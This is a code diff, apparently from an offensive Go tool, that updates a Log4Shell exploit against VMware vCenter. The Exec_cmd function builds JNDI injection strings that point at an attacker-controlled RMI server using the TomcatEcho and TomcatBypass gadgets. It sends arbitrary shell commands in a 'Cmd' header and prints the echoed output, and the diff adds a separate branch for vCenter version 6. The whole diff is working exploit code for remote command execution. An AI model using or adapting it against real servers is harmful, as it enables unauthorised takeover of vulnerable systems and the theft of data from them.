@@ -127,14 +127,23 @@ func exploit(url, rmiserver string) {
 
 }
 
-func Exec_cmd(url, rmiserver, command string) {
+func Exec_cmd(url, rmiserver, command, version string) bool {
 	host := rmiserver
 	client := req.C()
 	client.EnableForceHTTP1()
 	client.EnableInsecureSkipVerify()
 	client.SetTimeout(2 * time.Second)
 	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
-	rmi_server := fmt.Sprintf("${jndi:%s/TomcatBypass/TomcatEcho}", host)
+	rmi_server := ""
+	cmd := ""
+	if version == "6" {
+		rmi_server = fmt.Sprintf("${jndi:%s/Basic/TomcatEcho}", host)
+		cmd = command + " && echo nmsl"
+	} else {
+		rmi_server = fmt.Sprintf("${jndi:%s/TomcatBypass/TomcatEcho}", host)
+		cmd = command + ";echo 'nmsl'"
+	}
+
 	myheader := map[string]string{
 		"User-Agent":                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
 		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -145,7 +154,7 @@ func Exec_cmd(url, rmiserver, command string) {
 		"Sec-Fetch-Mode":            "navigate",
 		"Sec-Fetch-Site":            "none",
 		"Sec-Fetch-User":            "?1",
-		"Cmd":                       command + ";echo 'nmsl'",
+		"Cmd":                       cmd,
 	}
 
 	resp, err := client.R().
@@ -166,8 +175,10 @@ func Exec_cmd(url, rmiserver, command string) {
 		result = strings.Split(result, "nmsl")[0]
 		result = strings.TrimRight(result, "\n")
 		fmt.Println(result)
+		return true
 	} else {
-		fmt.Println("[-] 回显失败，目标不存在漏洞或其他原因.")
+
+		return false
 	}
 
 }
